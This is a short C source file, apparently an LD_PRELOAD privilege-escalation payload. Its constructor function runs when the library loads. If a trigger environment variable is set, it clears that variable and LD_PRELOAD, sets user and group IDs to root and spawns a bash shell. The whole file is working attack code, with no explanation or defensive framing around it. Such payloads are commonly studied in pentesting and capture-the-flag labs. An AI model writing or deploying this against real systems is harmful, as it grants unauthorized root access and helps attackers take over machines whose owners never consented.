#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init_rootshell() {
    if (getenv("rootshell")) {
        unsetenv("rootshell");
        unsetenv("LD_PRELOAD");
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", NULL);
    }
}


